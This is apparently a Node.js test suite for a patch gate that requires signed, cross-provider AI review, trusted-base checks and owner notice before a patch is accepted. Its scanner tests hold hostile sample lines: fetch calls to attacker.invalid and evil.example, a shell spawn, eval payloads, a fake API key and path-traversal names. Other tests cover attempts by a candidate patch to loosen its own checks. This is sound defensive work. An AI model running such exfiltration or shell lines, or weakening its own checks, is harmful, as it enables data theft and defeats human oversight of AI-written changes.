import {test} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {generateKeyPairSync, sign} from 'node:crypto';
import {execFileSync} from 'node:child_process';
import {TASK, canonical, sha256, classify, scanDiff, evaluate, subjectFor, verifyDeployment, reserveAction, finishAction, validateTrust, notificationReference, fetchNotificationReadback} from '../lib/patchgate.mjs';
import {collectSnapshot, loadBaseConfig} from '../patchgate.mjs';

const policy = JSON.parse(fs.readFileSync(new URL('../../config/patch-policy.json',import.meta.url)));
const now = Date.parse('2026-10-23T10:00:00Z');
const A = 'a'.repeat(40), B = 'b'.repeat(40), C = 'c'.repeat(40);
const pairs = ['openai','anthropic','aliyun_dashscope','volcengine_ark'].map((provider,i) => ({provider,id:'executor-'+i,...generateKeyPairSync('ed25519')}));
const trust = {schema_version:1,enabled:true,keys:pairs.map(k => ({id:k.id,provider:k.provider,executor:'test-executor-'+k.id,enabled:true,roles:['author','review','checks','deployment','notification','supervision','receipt_write'],
  not_before:'2026-10-22T00:00:00Z',not_after:'2026-10-24T00:00:00Z',public_key_pem:k.publicKey.export({type:'spki',format:'pem'})}))};
const file = name => ({path:name,mode:'100644',old_mode:'100644',diff:'diff --git a/'+name+' b/'+name+'\n--- a/'+name+'\n+++ b/'+name+'\n@@ -1 +1 @@\n-old\n+new\n'});
function noticeFor(subject,attestation,index=3) {
  const body='OWNER=@ltzyz2181-collab\nTASK_ID='+subject.task_id+'\nHEAD_SHA='+subject.head_sha+'\nSUBJECT_SHA256='+sha256(canonical(subject))+'\n';
  const reference='https://github.com/ltzyz2181-collab/ltzzz/pull/224#issuecomment-1';
  const ref=notificationReference(reference),readback={...ref,source:'github_rest_issue_comment',http_status:200,body,body_sha256:sha256(body),actor_login:'test-notifier-bot',actor_id:'42',fetched_at_utc:new Date(now).toISOString()};
  const proof=attestation(index,'notification',{owner_notified:true,reference,comment_sha256:sha256(body),subject_sha256:sha256(canonical(subject)),actor_login:readback.actor_login,actor_id:readback.actor_id});
  return {proof,readback};
}
function fixture(name='tests/example.test.mjs',configuration={}) {
  const p=configuration.policy||policy,t=configuration.trust||trust;
  const snapshot = {repository:p.repository,task_id:TASK,base_sha:A,head_sha:B,policy_sha256:sha256(canonical(p)),trust_sha256:sha256(canonical(t)),files:[file(name)]};
  const subject = subjectFor(snapshot);
  const attestation = (index,role,extra={}) => {
    const payload = {subject,role,at_utc:new Date(now).toISOString(),...extra};
    return {key_id:pairs[index].id,payload,signature:sign(null,Buffer.from(canonical(payload)),pairs[index].privateKey).toString('base64')};
  };
  const author = attestation(0,'author');
  const checks = attestation(3,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)});
  const review = i => attestation(i,'review',{verdict:'approve',generation_verified:true,model:'model-from-provider',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'});
  const notification=noticeFor(subject,attestation);
  const run = (attestations=[author,checks,review(1)], overrides={}) => evaluate({policy:p,trust:t,snapshot,attestations,notificationReadbacks:[notification.readback],now,...overrides});
  return {snapshot,subject,attestation,author,checks,review,run,notification};
}
function deployment(subject) {
  const bytes = Buffer.from(JSON.stringify({schema:'ltzzz.patchgate.canary.v1',source_commit:subject.head_sha})+'\n');
  return {head_sha:subject.head_sha,base_sha:subject.base_sha,target_environment:'canary',expected_version_id:'version-1',
    observation:{url:'https://ltzzz-patchgate-test.example.workers.dev',http_status:200,redirected:false,started_at_utc:'2026-10-23T09:59:58Z',finished_at_utc:'2026-10-23T10:00:00Z',http_date:'Fri, 23 Oct 2026 09:59:59 GMT',body_base64:bytes.toString('base64'),body_sha256:sha256(bytes),header_source_commit:subject.head_sha,header_version_id:'version-1'},
    platform:{source:'cloudflare_current_deployment_api',http_status:200,service_name:'ltzzz-patchgate-test',observed_at_utc:'2026-10-23T09:59:59Z',versions:[{id:'version-1',percentage:100}]}};
}

test('four risk levels and fail-closed unknown paths',() => {
  for (const [name,expected] of [['docs/example.md','L0'],['memory/agent.json','L3'],['memory/promote/queue.json','L3'],['memory/promote/notes.md','L3'],['docs/credentials.md','L3'],['ops/派单台账.md','L3'],['scripts/example.mjs','L3'],['tests/example.test.mjs','L1'],['workers/test/index.js','L2'],['wep3-worker.js','L2'],['wrangler.test.toml','L2'],['wallet/addresses.md','L3'],['config/review-delegation.json','L3'],['identity/dids/grok.json','L3'],['contracts/Escrow.sol','L3'],['.github/workflows/test.yml','L3'],['package.json','L3'],['unmapped/file','L3']]) assert.equal(classify(policy,[file(name)]).level,expected,name);
  assert.equal(classify(policy,[file('docs/active.js')]).level,'L3');
  assert.equal(classify(policy,[file('docs/a.md'),file('config/authority.json')]).level,'L3');
});
test('N2 only plain inbox/queue task cards are L1, not ledger, authority, receipts or code',()=>{
  for(const name of ['ops/dispatch/inbox/claude/TASK.md','ops/dispatch/queue/TASK.json'])assert.equal(classify(policy,[file(name)]).level,'L1',name);
  for(const name of ['ops/派单台账.md','ops/dispatch/receipts/TASK.json','ops/authority.json','ops/dispatch/inbox/gpt/task.mjs','ops/dispatch/inbox/gpt/secrets.json','ops/dispatch/inbox/gpt/AGENTS.md'])assert.equal(classify(policy,[file(name)]).level,'L3',name);
});
test('N2 every configured receipt transport is registered, without claiming signing keys exist',()=>{
  const registry=JSON.parse(fs.readFileSync(new URL('../../config/patchgate-executors.json',import.meta.url))),root=JSON.parse(fs.readFileSync(new URL('../../config/patchgate-trust.json',import.meta.url)));
  const ids=new Set(registry.executors.map(e=>e.id));assert.equal(ids.size,registry.executors.length);
  for(const rule of policy.receipt_writer_rules)for(const id of rule.executors)assert.ok(ids.has(id),id);
  assert.equal(registry.executors.every(e=>e.signing_enabled===false && e.signing_key_ids.length===0),true);
  assert.equal(root.enabled,false);assert.equal(root.keys.length,0);
});
test('deterministic transports cannot masquerade as native author/review providers',()=>{
  const bot={...trust.keys[3],provider:'github_actions',roles:['notification','receipt_write']};
  assert.equal(validateTrust({...trust,keys:[bot]}),true);
  assert.equal(validateTrust({...trust,keys:[{...bot,roles:['review']}]}),false);
});
test('H1 financial, signing, auth and unknown runtime scripts are all L3',() => {
  for(const name of ['scripts/funded-invest-executor.mjs','scripts/provision-funding-executor.mjs','scripts/prepare-treasury-migration.mjs','scripts/provision-wep3-treasury.mjs','scripts/execute-agent-payment.mjs','scripts/generate-wallet-key.mjs','scripts/lib/proxy-auth.mjs','lib/proxy-auth.js','scripts/new-innocent-name.mjs','scripts/package.json']) assert.equal(classify(policy,[file(name)]).level,'L3',name);
  assert.equal(classify(policy,[file('scripts/tests/funded-invest.test.mjs')]).level,'L1');
});
test('H2 receipts, ledgers and every core-memory original are L3; only markdown docs may be L0',() => {
  for(const name of ['knowledge/results/dispatch/oversight/latest.json','knowledge/results/fake.md','results/settlement.json','data/results/daily.json','ops/派单台账.md',...['魄','识神','梦境数据库','文明研究','项目历史','重要事件'].map(n=>'ltzzz-memory/'+n+'.md')]) assert.equal(classify(policy,[file(name)]).level,'L3',name);
  assert.equal(classify(policy,[file('docs/fake-receipt.json')]).level,'L3');
  assert.equal(classify(policy,[file('docs/ordinary.md')]).level,'L0');
});
test('H2 a hand-authored accepted/paid receipt needs a BASE-authorized signed writer',() => {
  const name='knowledge/results/accepted.json',f=fixture(name);
  const notify=x=>x.notification.proof;
  assert.ok(f.run([f.author,f.checks,f.review(1),f.review(2),notify(f),f.attestation(3,'receipt_write',{paths:[name],accepted:true,paid:true})]).reasons.includes('authenticated_receipt_writer_required'));
  const p={...policy,receipt_writer_rules:policy.receipt_writer_rules.map(r=>({...r,executors:[trust.keys[3].executor]}))},g=fixture(name,{policy:p});
  const base=[g.author,g.checks,g.review(1),g.review(2),notify(g)];
  assert.equal(g.run(base).validation_passed,false);
  assert.equal(g.run([...base,g.attestation(3,'receipt_write',{paths:['knowledge/results/other.json']})]).validation_passed,false);
  assert.equal(g.run([...base,g.attestation(3,'receipt_write',{paths:[name]})]).validation_passed,true);
});
for (const name of ['config/patch-policy.json','config/patchgate-trust.json','scripts/lib/patchgate.mjs','scripts/tests/patchgate.test.mjs','.github/workflows/patchgate.yml','scripts/patchgate.mjs']) {
  test('same patch cannot alter own constraint: '+name,() => {
    const f=fixture(name),r=f.run([f.author,f.checks,f.review(1),f.review(2),f.notification.proof]);
    assert.ok(r.reasons.includes('cannot_modify_own_constraints_requires_separate_trust_rollout'));
    assert.equal(r.automatic_merge,false);
  });
}
test('L0 still requires authenticated identity and baseline tests, not merely a claimed label',() => {
  const f=fixture('docs/test.md');
  assert.equal(f.run([f.author,f.checks]).validation_passed,true);
  assert.equal(f.run([]).validation_passed,false);
});
test('L1 review must be from a different authenticated upstream provider',() => {
  const f=fixture();
  assert.equal(f.run([f.author,f.checks,f.review(0)]).validation_passed,false);
  assert.equal(f.run().status,'validated_not_activated');
});
test('provider is derived from registered key, not payload provider or shared GitHub login',() => {
  const f=fixture(),fake=f.attestation(0,'review',{verdict:'approve',generation_verified:true,provider:'anthropic',author_provider:'anthropic',model:'Claude',metadata_source:'provider_response',finish_reason:'stop',output_sha256:'2'.repeat(64)});
  assert.equal(f.run([f.author,f.checks,fake]).validation_passed,false);
  const tampered=f.review(1); tampered.key_id='executor-0';
  assert.equal(f.run([f.author,f.checks,tampered]).validation_passed,false);
});
test('signed rejection is retained; no relabeling of rejection as approval',() => {
  const f=fixture();
  const rejected=f.attestation(2,'review',{verdict:'revise'});
  assert.ok(f.run([f.author,f.checks,f.review(1),rejected]).reasons.includes('review_requires_revision'));
});
test('new head, base, policy, or diff invalidates existing proofs',() => {
  const f=fixture();
  for (const mutation of [{head_sha:C},{base_sha:C},{files:[file('scripts/changed.mjs')]},{policy_sha256:'3'.repeat(64)}]) {
    const r=f.run(undefined,{snapshot:{...f.snapshot,...mutation}});
    assert.equal(r.validation_passed,false);
  }
});
test('checks must be bound to trusted base, not tests modified by the candidate',() => {
  const f=fixture(),checks=f.attestation(0,'checks',{passed:true,checker_base_sha:B,checks_sha256:'1'.repeat(64)});
  assert.ok(f.run([f.author,checks,f.review(1)]).reasons.includes('trusted_base_checks_required'));
});
test('H3 valid checks signed by the author executor are rejected even with the checks role',() => {
  const f=fixture(),self=f.attestation(0,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)});
  assert.ok(f.run([f.author,self,f.review(1)]).reasons.includes('trusted_base_checks_required'));
  assert.equal(f.run().checks_executors[0],trust.keys[3].executor);
});
test('H4 one executor cannot be relabeled as two providers using two different keys',() => {
  const modified={...trust,keys:trust.keys.map((k,i)=>i===1?{...k,executor:trust.keys[0].executor}:k)};
  assert.equal(validateTrust(modified),false);
  const f=fixture(undefined,{trust:modified});
  assert.ok(f.run().reasons.includes('executor_provider_registry_invalid'));
});
test('H4 key rotation keeps executor/provider binding; aliases cannot bypass H3',() => {
  const {publicKey}=generateKeyPairSync('ed25519');
  assert.equal(validateTrust({...trust,keys:[...trust.keys,{...trust.keys[0],id:'rotation',public_key_pem:publicKey.export({type:'spki',format:'pem'})}]}),true);
  assert.equal(validateTrust({...trust,keys:[...trust.keys,{...trust.keys[0],id:'clone',executor:'pretend-independent-executor'}]}),false);
});
test('missing, revoked, expired or forged executor key cannot authorize',() => {
  const f=fixture();
  for (const modified of [{...trust,enabled:false},{...trust,keys:[]},{...trust,keys:trust.keys.map(k=>({...k,enabled:false}))},{...trust,keys:trust.keys.map(k=>({...k,not_after:'2026-10-23T09:00:00Z'}))}]) assert.equal(f.run(undefined,{trust:modified}).validation_passed,false);
  assert.equal(f.run(undefined,{now:now+86401000}).validation_passed,false);
  assert.equal(f.run(undefined,{now:now-1000}).validation_passed,false);
});
test('the same public key cannot impersonate different providers or duplicate key IDs',() => {
  const f=fixture();
  const reused={...trust,keys:trust.keys.map((k,i)=>i===1?{...k,public_key_pem:trust.keys[0].public_key_pem}:k)};
  const snapshot={...f.snapshot,trust_sha256:sha256(canonical(reused))},subject=subjectFor(snapshot);
  const payload={subject,role:'author',at_utc:new Date(now).toISOString()};
  const author={key_id:pairs[0].id,payload,signature:sign(null,Buffer.from(canonical(payload)),pairs[0].privateKey).toString('base64')};
  assert.ok(evaluate({policy,trust:reused,snapshot,now,attestations:[author]}).reasons.includes('one_authenticated_author_required'));
  const duplicate={...trust,keys:[...trust.keys,trust.keys[0]]};
  assert.equal(f.run(undefined,{trust:duplicate}).validation_passed,false);
});
test('incomplete model output cannot serve as an independent review',() => {
  const f=fixture();
  for (const change of [{finish_reason:'length'},{metadata_source:'model_self_report'},{generation_verified:false},{model:''},{output_sha256:'not-a-hash'}]) {
    const review=f.attestation(1,'review',{verdict:'approve',generation_verified:true,model:'real',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop',...change});
    assert.equal(f.run([f.author,f.checks,review]).validation_passed,false);
  }
});
test('L3 requires two different review providers and owner notification, no new owner approval',() => {
  const f=fixture('identity/seat-registry.json');
  assert.equal(f.run().validation_passed,false);
  assert.equal(f.run([f.author,f.checks,f.review(1),f.review(1)]).validation_passed,false);
  assert.equal(f.run([f.author,f.checks,f.review(1),f.review(2)]).validation_passed,false);
  const r=f.run([f.author,f.checks,f.review(1),f.review(2),f.notification.proof]);
  assert.equal(r.validation_passed,true);
  assert.equal(r.automatic_merge,false);
});
test('N1 author cannot sign their own notice, even when readback is genuine',()=>{
  const f=fixture('config/example.json'),self=noticeFor(f.subject,f.attestation,0);
  assert.ok(f.run([f.author,f.checks,f.review(1),f.review(2),self.proof]).reasons.includes('owner_notification_evidence_required'));
  const r=f.run([f.author,f.checks,f.review(1),f.review(2),f.notification.proof]);
  assert.equal(r.validation_passed,true);assert.equal(r.notification_readback_verified,true);assert.deepEqual(r.notification_executors,[trust.keys[3].executor]);
});
test('N1 notice needs exact live readback: wrong head, edit, actor, stale/deleted/wrong comment all fail',()=>{
  const f=fixture('config/example.json'),proof=f.notification.proof,base=[f.author,f.checks,f.review(1),f.review(2),proof];
  assert.equal(f.run(base,{notificationReadbacks:[]}).validation_passed,false);
  for(const change of [{http_status:404},{actor_login:'other'},{body:f.notification.readback.body.replace(B,C)},{body:f.notification.readback.body+'HEAD_SHA='+C+'\n'},{body_sha256:'0'.repeat(64)},{comment_id:'2'},{fetched_at_utc:new Date(now-301000).toISOString()}]) {
    const rb={...f.notification.readback,...change};assert.equal(f.run(base,{notificationReadbacks:[rb]}).validation_passed,false,JSON.stringify(change));
  }
});
test('N1 network collector restricts GitHub comment endpoint and actually returns fetched bytes',async()=>{
  const f=fixture(),n=f.notification;let called=null;
  const got=await fetchNotificationReadback(n.readback.reference,{now:()=>new Date(now).toISOString(),fetchImpl:async(url,options)=>{called={url,options};return {status:200,text:async()=>JSON.stringify({id:1,html_url:n.readback.reference,body:n.readback.body,user:{id:42,login:'test-notifier-bot'}})};}});
  assert.equal(got.body_sha256,n.readback.body_sha256);assert.equal(called.url,n.readback.api_url);assert.equal(called.options.redirect,'error');
  await assert.rejects(fetchNotificationReadback('https://github.com/attacker/repo/issues/1#issuecomment-1',{fetchImpl:async()=>{throw Error('must not call');}}),/exact_repository/);
  await assert.rejects(fetchNotificationReadback(n.readback.reference,{fetchImpl:async()=>({status:404})}),/not_readable/);
});
test('secret scan redacts findings; dynamic execution and new domains require resolution',() => {
  const changes=[['sk-'+'X'.repeat(24),'secret_pattern'],['eval("untrusted")','new_dynamic_execution_requires_review'],['import c from "node:child_process"','new_dynamic_execution_requires_review'],['https://attacker.invalid/collect','unapproved_external_host']];
  for (const [text,code] of changes) {
    const findings=scanDiff(policy,[{...file('scripts/test.mjs'),diff:'@@ -0,0 +1 @@\n+ '+text}]);
    assert.ok(findings.some(x=>x.code===code));
    if (code==='secret_pattern') assert.ok(!JSON.stringify(findings).includes(text));
  }
  assert.equal(scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+ https://ltzzz.com/docs'}]).length,0);
  assert.ok(scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+ http://ltzzz.com/docs'}]).length);
});
test('added code beginning with ++ cannot hide eval, credentials or new hosts behind +++',() => {
  const source='++counter; eval("payload"); const key="sk-'+'X'.repeat(24)+'"; fetch("https://attacker.invalid/collect");';
  const diff='diff --git a/scripts/a.mjs b/scripts/a.mjs\n--- a/scripts/a.mjs\n+++ b/scripts/a.mjs\n@@ -0,0 +1 @@\n+'+source+'\n';
  const findings=scanDiff(policy,[{...file('scripts/a.mjs'),diff}]);
  for (const code of ['secret_pattern','new_dynamic_execution_requires_review','unapproved_external_host']) assert.ok(findings.some(x=>x.code===code));
});
test('deleted suspect line is not incorrectly treated as newly introduced',() => {
  assert.equal(scanDiff(policy,[{...file('scripts/test.mjs'),diff:'@@ -1 +1 @@\n- eval("old")\n+ safe()'}]).length,0);
});
test('M2 common bypasses are flagged, normal words are not credentials, no-findings is not safety',() => {
  for(const line of ["new WebSocket('wss://evil.example/x')","Function('return process')()","spawn('sh',['-c','id'])","fetch('//evil.example/x')"]) assert.ok(scanDiff(policy,[{...file('scripts/a.mjs'),diff:'@@ -0,0 +1 @@\n+'+line}]).length,line);
  for(const line of ['task-queue-runner-config-notes','risk-adjusted-return-calculation-method']) assert.equal(scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+'+line}]).some(f=>f.code==='secret_pattern'),false,line);
  assert.equal(fixture().run().scan_safety_conclusion,false);
});
test('GitHub URLs are restricted to this repository, not any github.com destination',() => {
  const scan=url=>scanDiff(policy,[{...file('docs/a.md'),diff:'@@ -0,0 +1 @@\n+ '+url}]);
  assert.equal(scan('https://github.com/ltzyz2181-collab/ltzzz/pull/223').length,0);
  assert.ok(scan('https://github.com/attacker/collect').some(f=>f.code==='unapproved_external_host'));
});
test('path traversal, symlinks, gitlinks and binary data cannot pass',() => {
  const f=fixture();
  for (const mode of ['120000','160000']) assert.ok(classify(policy,[{...file('docs/a.md'),mode}]).reasons.length);
  for (const name of ['../config/a.json','/tmp/a','docs/../../a','docs\\a','docs/.git/config','docs/a\n.md']) assert.throws(()=>subjectFor({...f.snapshot,files:[file(name)]}));
  assert.equal(f.run(undefined,{snapshot:{...f.snapshot,files:[{...file('docs/a.md'),binary:true,diff:null}]}}).validation_passed,false);
});
test('diff and file limits are enforced even if otherwise correctly signed',() => {
  const f=fixture(),limited={...policy,max_files:1,max_diff_bytes:1};
  const r=f.run(undefined,{policy:limited,snapshot:{...f.snapshot,policy_sha256:sha256(canonical(limited))}});
  assert.ok(r.reasons.includes('diff_limit_exceeded'));
});
test('three signed distinct failures add a review without disabling the seat',() => {
  const f=fixture();
  const failures=[0,1,2].map(i=>f.attestation(1,'supervision',{subject:{...f.subject,task_id:TASK+'-'+i},failed_provider:'openai',result:'failed'}));
  const r=f.run(undefined,{failures});
  assert.equal(r.additional_review_due_to_failures,1);
  assert.equal(r.validation_passed,false);
  assert.equal(f.run([f.author,f.checks,f.review(1),f.review(2)],{failures}).validation_passed,true);
  assert.equal(f.run(undefined,{failures:[failures[0],failures[0],failures[0]]}).additional_review_due_to_failures,0);
  assert.equal(f.run(undefined,{failures:failures.map(x=>({...x,signature:'invented'}))}).additional_review_due_to_failures,0);
});
test('same key is reserved only once; unknown outcome never retries automatically',() => {
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'ltzzz-patchgate-'));
  try {
    const args={directory:dir,taskId:TASK,headSha:B,action:'deploy'};
    const first=reserveAction(args);
    assert.equal(first.reserved,true);
    assert.equal(reserveAction(args).reserved,false);
    const finished=finishAction({reservation:first,result:{status:'outcome_unknown'}});
    assert.equal(JSON.parse(fs.readFileSync(finished)).result.status,'outcome_unknown');
    assert.equal(reserveAction(args).reserved,false);
    assert.throws(()=>finishAction({reservation:first,result:{status:'completed'}}));
    assert.equal(reserveAction({...args,action:'merge'}).reserved,true);
    assert.equal(reserveAction({...args,headSha:C}).reserved,true);
  } finally { fs.rmSync(dir,{recursive:true,force:true}); }
});
test('freshness and Cloudflare CURRENT version are deterministic requirements, not log self-reports',() => {
  const f=fixture('workers/a.js'),e=deployment(f.subject);
  const allowedTargets=[{url:e.observation.url}],result=verifyDeployment({subject:f.subject,evidence:e,allowedTargets,now});
  assert.equal(result.status,'reverified_deterministic');
  assert.equal(result.model_verdict_required,false);
  assert.equal(result.rollback_verified,false);
  const cases=[x=>x.observation.header_source_commit=A,x=>x.observation.http_date='Fri, 23 Oct 2026 09:00:00 GMT',x=>x.observation.header_version_id='old',x=>x.platform.versions[0].id='different',x=>x.platform.versions[0].percentage=50,x=>x.platform.source='deploy_job_log',x=>x.observation.redirected=true,x=>x.observation.body_sha256='0'.repeat(64),x=>x.observation.url='http://ltzzz-patchgate-test.example.workers.dev',x=>x.target_environment='production'];
  for (const mutate of cases) { const changed=structuredClone(e);mutate(changed);assert.equal(verifyDeployment({subject:f.subject,evidence:changed,allowedTargets,now}).passed,false); }
  assert.equal(verifyDeployment({subject:f.subject,evidence:e,allowedTargets,now:now+301000}).passed,false,'old observation cannot be freshly re-attested');
  assert.equal(verifyDeployment({subject:f.subject,evidence:e,allowedTargets,now:now-10000}).passed,false,'future observation is invalid');
  assert.equal(verifyDeployment({subject:f.subject,evidence:e,now}).passed,false,'standalone verifier also requires the base allowlist');
  assert.equal(verifyDeployment({subject:f.subject,evidence:e,allowedTargets:[{url:'https://other.example.workers.dev'}],now}).passed,false);
  const cumulative=structuredClone(e);
  Object.assign(cumulative.observation,{started_at_utc:'2026-10-23T09:50:02Z',finished_at_utc:'2026-10-23T09:55:01Z',http_date:'Fri, 23 Oct 2026 09:45:03 GMT'});
  cumulative.platform.observed_at_utc='2026-10-23T09:50:03Z';
  assert.equal(verifyDeployment({subject:f.subject,evidence:cumulative,allowedTargets,now}).checks.fresh,false,'clock allowances cannot accumulate');
});
test('commit marker must be a dedicated metadata object, not an embedded matching substring',() => {
  const f=fixture('workers/a.js'),e=deployment(f.subject),allowedTargets=[{url:e.observation.url}];
  for (const value of ['<!-- SOURCE_COMMIT='+B+' -->',JSON.stringify({comment:'SOURCE_COMMIT='+B}),JSON.stringify({schema:'ltzzz.patchgate.canary.v1',source_commit:A,comment:'SOURCE_COMMIT='+B}),'{"schema":"ltzzz.patchgate.canary.v1","source_commit":"'+A+'","source_commit":"'+B+'"}\n']) {
    const changed=structuredClone(e),bytes=Buffer.from(value);
    changed.observation.body_base64=bytes.toString('base64');changed.observation.body_sha256=sha256(bytes);
    assert.equal(verifyDeployment({subject:f.subject,evidence:changed,allowedTargets,now}).checks.commit,false);
  }
});
test('L2 canary must be signed and target must be in BASE allowlist',() => {
  const f=fixture('workers/a.js'),e=deployment(f.subject),proof=f.attestation(0,'deployment',{evidence:e});
  assert.equal(f.run([f.author,f.checks,f.review(1),proof]).validation_passed,false);
  const p={...policy,canary_targets:[{url:e.observation.url}]};
  const g=fixture('workers/a.js');g.snapshot.policy_sha256=sha256(canonical(p));
  const subject=subjectFor(g.snapshot);
  const attest=(i,role,extra={})=>{const payload={subject,role,at_utc:new Date(now).toISOString(),...extra};return {key_id:pairs[i].id,payload,signature:sign(null,Buffer.from(canonical(payload)),pairs[i].privateKey).toString('base64')};};
  const r=evaluate({policy:p,trust,snapshot:g.snapshot,now,attestations:[attest(0,'author'),attest(3,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)}),attest(1,'review',{verdict:'approve',generation_verified:true,model:'real',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'}),attest(3,'deployment',{evidence:deployment(subject)})]});
  assert.equal(r.validation_passed,true);
  assert.equal(r.deployment_verification.status,'reverified_deterministic');
});
test('H3 canary verification signed by the author is rejected, another executor passes',() => {
  const p={...policy,canary_targets:[{url:'https://ltzzz-patchgate-test.example.workers.dev'}]},f=fixture('workers/a.js',{policy:p});
  const evidence=deployment(f.subject),base=[f.author,f.checks,f.review(1)];
  assert.ok(f.run([...base,f.attestation(0,'deployment',{evidence})]).reasons.includes('signed_allowlisted_canary_verification_required'));
  assert.equal(f.run([...base,f.attestation(3,'deployment',{evidence})]).deployment_verification.status,'reverified_deterministic');
});
test('adding L3 to a Worker patch never removes the L2 canary prerequisite',() => {
  const original=fixture('workers/a.js'),snapshot={...original.snapshot,files:[file('workers/a.js'),file('config/example.json')]};
  const subject=subjectFor(snapshot),attest=(i,role,extra={})=>{const payload={subject,role,at_utc:new Date(now).toISOString(),...extra};return {key_id:pairs[i].id,payload,signature:sign(null,Buffer.from(canonical(payload)),pairs[i].privateKey).toString('base64')};};
  const attestations=[attest(0,'author'),attest(3,'checks',{passed:true,checker_base_sha:A,checks_sha256:'1'.repeat(64)}),...[1,2].map(i=>attest(i,'review',{verdict:'approve',generation_verified:true,model:'real',output_sha256:'2'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'})),attest(0,'notification',{owner_notified:true,reference:'https://github.com/ltzyz2181-collab/ltzzz/issues/1'})];
  const r=evaluate({policy,trust,snapshot,attestations,now});
  assert.equal(r.risk_class,'L3');assert.equal(r.requires_canary,true);assert.equal(r.validation_passed,false);
  assert.ok(r.reasons.includes('signed_allowlisted_canary_verification_required'));
});
test('configuration is loaded through BASE reader, never the candidate checkout',() => {
  const paths=[];
  const actual=loadBaseConfig({base:A,read:p=>{paths.push(p);return JSON.stringify(p.endsWith('trust.json')?trust:policy);}});
  assert.deepEqual(paths,['config/patch-policy.json','config/patchgate-trust.json']);
  assert.equal(actual.policy_sha256,sha256(canonical(policy)));
});
test('real Git snapshot ignores candidate policy and includes every modified path and mode',() => {
  const root=fs.mkdtempSync(path.join(os.tmpdir(),'patchgate-git-')),prior=process.cwd();
  const git=args=>execFileSync('git',args,{cwd:root,encoding:'utf8'}).trim();
  try {
    git(['init','--quiet']);git(['config','user.name','patchgate-test']);git(['config','user.email','patchgate-test@example.invalid']);
    fs.mkdirSync(path.join(root,'config'));fs.mkdirSync(path.join(root,'docs'));
    fs.writeFileSync(path.join(root,'config/patch-policy.json'),JSON.stringify(policy));
    fs.writeFileSync(path.join(root,'config/patchgate-trust.json'),JSON.stringify(trust));
    fs.writeFileSync(path.join(root,'docs/a.md'),'old\n');
    git(['add','.']);git(['commit','--quiet','-m','trusted base']);const base=git(['rev-parse','HEAD']);
    fs.writeFileSync(path.join(root,'config/patch-policy.json'),JSON.stringify({...policy,automatic_merge:true,l3_prefixes:[]}));
    fs.writeFileSync(path.join(root,'docs/a.md'),'new\n');
    fs.writeFileSync(path.join(root,'docs/new 文档.md'),'added\n');
    git(['add','.']);git(['commit','--quiet','-m','candidate tries to weaken its own checks']);const head=git(['rev-parse','HEAD']);
    process.chdir(root);
    const s=collectSnapshot({base,head,taskId:TASK});
    assert.equal(s.policy.automatic_merge,false);
    assert.deepEqual(s.snapshot.files.map(f=>f.path).sort(),['config/patch-policy.json','docs/a.md','docs/new 文档.md'].sort());
    assert.ok(evaluate({...s,now}).reasons.includes('cannot_modify_own_constraints_requires_separate_trust_rollout'));
  } finally { process.chdir(prior);fs.rmSync(root,{recursive:true,force:true}); }
});
test('production flags are rejected; a test verdict cannot activate mutation adapters',() => {
  const f=fixture();
  for (const flag of ['automatic_merge','automatic_deploy','automatic_rollback','real_funds_enabled']) assert.throws(()=>f.run(undefined,{policy:{...policy,[flag]:true}}));
  const r=f.run();
  assert.deepEqual([r.automatic_merge,r.automatic_deploy,r.automatic_rollback,r.paid,r.tx_hash],[false,false,false,false,null]);
});
